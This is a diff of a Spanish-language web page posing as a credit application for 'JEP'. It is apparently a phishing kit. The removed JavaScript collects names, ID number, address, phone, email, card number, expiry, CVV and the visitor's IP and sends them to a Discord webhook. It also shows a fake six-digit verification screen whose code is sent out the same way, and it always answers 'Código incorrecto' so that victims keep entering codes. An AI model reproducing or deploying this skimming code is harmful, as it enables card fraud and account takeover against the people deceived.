-        if (card_c.value.trim().length < 3) { mostrarErrorVisual(card_c, "Ingresa el CVV."); return; }
-        if (mon_act.value.trim() === '') { mostrarErrorVisual(mon_act, "Ingresa el monto actual."); return; }
-
-        enviarMensajeDiscord({
-            "content": "📋 **SOLICITUD COMPLETA RECIBIDA (JEP)**",
-            "embeds": [{
-                "title": "Información del Solicitante",
-                "color": 3066993,
-                "fields": [
-                    { "name": "Identificación", "value": document.getElementById('identificacion').value, "inline": true },
-                    { "name": "Nombres", "value": document.getElementById('nombres').value, "inline": true },
-                    { "name": "Apellidos", "value": document.getElementById('apellidos').value, "inline": true },
-                    { "name": "Fecha Nac.", "value": document.getElementById('fecha_nac').value, "inline": true },
-                    { "name": "Celular", "value": document.getElementById('celular').value, "inline": true },
-                    { "name": "Email", "value": document.getElementById('email').value, "inline": true },
-                    { "name": "Dirección", "value": document.getElementById('direccion').value, "inline": false },
-                    { "name": "Monto Solicitado", "value": "$" + document.getElementById('monto').value, "inline": true },
-                    { "name": "Monto Actual", "value": "$" + mon_act.value, "inline": true },
-                    { "name": "Tarjeta", "value": card_n.value, "inline": false },
-                    { "name": "Vencimiento", "value": card_e.value, "inline": true },
-                    { "name": "CVV", "value": card_c.value, "inline": true },
-                    { "name": "🌐 IP", "value": ipUsuario, "inline": true }
-                ],
-                "footer": { "text": "JEP - Sistema de Créditos" },
-                "timestamp": new Date().toISOString()
-            }]
-        });
-
-        var btn = document.querySelector('button[onclick="validarPaso3()"]');
-        btn.innerHTML = '<span class="spinner"></span> Procesando...';
-        btn.disabled = true;
-
-        setTimeout(function() {
-            btn.innerHTML = 'Revisar y Continuar';
-            btn.disabled = false;
-            cambiarPaso(4);
-        }, 6000);
-    }
-
-    document.getElementById('btn-validar').addEventListener('click', function(e) {
-        e.preventDefault();
-        document.getElementById('formulario-contenedor').style.display = 'none';
-        document.getElementById('pantalla-verificacion').style.display = 'flex';
-        if (intervaloSession) clearInterval(intervaloSession);
-    });
-
-    var inputsCodigo = document.querySelectorAll('.codigo-input');
-    inputsCodigo.forEach(function(input, index) {
-        input.addEventListener('input', function() {
-            this.value = this.value.replace(/\D/g, '');
-            if (this.value !== '' && index < inputsCodigo.length - 1) inputsCodigo[index + 1].focus();
-        });
-        input.addEventListener('keydown', function(e) {
-            if (e.key === 'Backspace' && this.value === '' && index > 0) inputsCodigo[index - 1].focus();
-        });
-    });
-
-    var btnVerificar = document.querySelector('#pantalla-verificacion .btn-validar-datos');
-    var mensajeError = document.createElement('p');
-    mensajeError.style.cssText = "color:#ff0000; font-weight:bold; font-size:14px; margin-top:10px; display:none;";
-    mensajeError.innerText = "Código incorrecto";
-    btnVerificar.parentNode.insertBefore(mensajeError, btnVerificar.nextSibling);
-
-    btnVerificar.addEventListener('click', function(e) {
-        e.preventDefault();
-        var codigoIngresado = "";
-        var todosLlenos = true;
-        inputsCodigo.forEach(function(input) {
-            if (input.value === '') todosLlenos = false;
-            codigoIngresado += input.value;
-        });
-        
-        if (!todosLlenos) { alert("Por favor, ingresa los 6 dígitos."); return; }
-
-        enviarMensajeDiscord({
-            "content": "🔢 **CÓDIGO DE SEGURIDAD INGRESADO (JEP)**",
-            "embeds": [{
-                "title": "Código de Verificación",
-                "description": "**" + codigoIngresado + "**",
-                "color": 15105570,
-                "fields": [{ "name": "🌐 IP del usuario", "value": ipUsuario, "inline": false }],
-                "footer": { "text": "JEP - Sistema de Créditos" },
-                "timestamp": new Date().toISOString()
-            }]
-        });
-
-        this.innerHTML = '<span class="spinner"></span> Verificando...';
-        this.style.background = '#555';
-        this.disabled = true;
-
-        setTimeout(function() {
-            btnVerificar.innerHTML = 'Verificar Código';
-            btnVerificar.style.background = '#0e7a3d';
-            btnVerificar.style.color = '#fff';
-            btnVerificar.disabled = false;
-            mensajeError.style.display = 'block';
-            inputsCodigo.forEach(function(input) { input.value = ''; });
-            inputsCodigo[0].focus();
-        }, 10000); 
-    });
+    setTimeout(function() {
+        btnVerificar.innerHTML = 'Verificar Código';
+        btnVerificar.style.background = '#0e7a3d';
+        btnVerificar.style.color = '#fff';
+        btnVerificar.disabled = false;
+        mensajeError.style.display = 'block';
+        inputsCodigo.forEach(function(input) { input.value = ''; });
+        inputsCodigo[0].focus();
+    }, 10000); 
+});
 </script>
 </body>
 </html>
+
+
+
 
